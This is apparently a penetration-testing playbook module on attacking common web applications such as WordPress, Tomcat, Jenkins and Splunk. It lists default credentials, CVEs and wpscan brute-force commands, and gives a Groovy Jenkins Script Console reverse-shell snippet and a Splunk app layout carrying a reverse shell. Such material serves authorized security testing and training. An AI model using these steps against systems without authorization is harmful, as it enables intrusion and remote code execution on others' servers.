# Module 08: Common Applications Attack Methodology

## When to Use This Module
Use this module when you discover common web applications such as CMS platforms (WordPress, Joomla, Drupal), servlet containers (Tomcat, JBoss), CI/CD tools (Jenkins, GitLab), monitoring tools (Splunk, PRTG, Nagios), or other commonly deployed applications.

## Prerequisites
- Application identified by fingerprinting (from Module 02 or 04)
- Application version number (from HTTP headers, page source, or /README)

## Entry Check

```
Application discovered during web enum?
├── Fingerprint the application → See decision tree below
├── Determine version → Check for known CVEs
├── Try default credentials immediately
└── Enumerate functionality (authenticated or not)
```

## Application Decision Trees

### CMS Detection Flow
```
Application page loaded?
├── WordPress?
│   ├── Indicators: /wp-content, /wp-admin, /wp-json
│   ├── wpscan --url http://target --enumerate u,vp,vt
│   ├── Check for XML-RPC (brute force vector)
│   ├── Check for debug log: /wp-content/debug.log
│   └── Default admin: admin, admin
│
├── Joomla?
│   ├── Indicators: /administrator, /components, /modules
│   ├── joomscan -u http://target
│   ├── Check /administrator/manifests/files/joomla.xml for version
│   └── Default creds: admin:admin
│
├── Drupal?
│   ├── Indicators: /node, CHANGELOG.txt
│   ├── droopescan scan drupal -u http://target
│   ├── Drupalgeddon2/3: CVE-2018-7600, CVE-2018-7602
│   └── Check /user/register for open registration
│
├── Tomcat?
│   ├── Indicators: /manager/html, port 8080/8009
│   ├── Default creds: tomcat:tomcat, admin:admin
│   ├── WAR file upload → RCE via manager interface
│   ├── Ghostcat (CVE-2020-1938) → AJP file read
│   └── Check /examples for sample apps
│
└── Unknown? → Wappalyzer + whatweb + searchsploit
```

### Application-Specific Attacks

| Application | Default Creds | Key Attack Vectors |
|---|---|---|
| **Jenkins** | admin:admin | Script Console RCE; /script, /manage |
| **Splunk** | admin:changeme | Custom app deployment → RCE; debug/execute |
| **PRTG** | prtgadmin:prtg | CVE-2018-9276 (authenticated RCE); notification RCE |
| **GitLab** | register self | Public repos containing secrets; API access; auth RCE |
| **osTicket** | admin:(varies) | File upload bypass; SQLi in ticket system |
| **phpMyAdmin** | root:(empty) | SQL query execution; SELECT INTO OUTFILE → webshell |
| **Nagios** | nagiosadmin:nagiosadmin | Command injection; plugin upload |
| **ColdFusion** | admin:admin | CVE-2010-2861 (directory traversal); FCKeditor RCE |
| **DotNetNuke** | admin:admin | Cookie deserialization RCE |
| **IIS** | varies | Tilde enumeration (~1) for file discovery; WebDAV PUT |
| **Elasticsearch** | none | Open API: /_cat, /_search, /_nodes |
| **Jenkins** | admin:admin | Script Console at /script → Groovy RCE |
| **Axis2** | admin:axis2 | WebShell via .aar deployment |
| **JBoss** | admin:admin | jmx-console, web-console, admin-console |

### Jenkins RCE (Script Console)

```groovy
// Groovy script for reverse shell
def cmd = "powershell -enc <base64_rev_shell>"
def proc = cmd.execute()
proc.waitFor()
println "Exit code: ${proc.exitValue()}"
println "Stdout: ${proc.in.text}"
println "Stderr: ${proc.err.text}"
```

### Splunk Custom App RCE

```bash
# Create a custom Splunk app with a reverse shell
splunk-app/
├── app.conf
└── bin/
    └── revshell.sh  # Contains reverse shell one-liner

# Then deploy through Splunk UI:
# Apps → Manage Apps → Install app from file
```

### WordPress wpscan

```bash
# Enumerate users, vulnerable plugins, themes
wpscan --url http://target --enumerate u
wpscan --url http://target --enumerate vp
wpscan --url http://target --enumerate vt

# Brute force (XML-RPC)
wpscan --url http://target --passwords rockyou.txt
```

## Cross-References
- For web app attacks (SQLi, XSS, LFI) → [Module 04: Web Application](../modules/04-web-application.md)
- For shells after RCE → [Module 05: Initial Access](../modules/05-initial-access.md)
- For service-level attacks → [Module 07: Common Services](../modules/07-common-services.md)
- For CMS-specific wordlists → /usr/share/seclists/Discovery/Web-Content/CMS/

## Output Summary
- [ ] Application fingerprinted and version identified
- [ ] Default credentials attempted
- [ ] Known CVEs checked against version
- [ ] wpscan/joomscan/droopescan run (if applicable)
- [ ] Authenticated functionality enumerated
- [ ] RCE attempted via application functionality
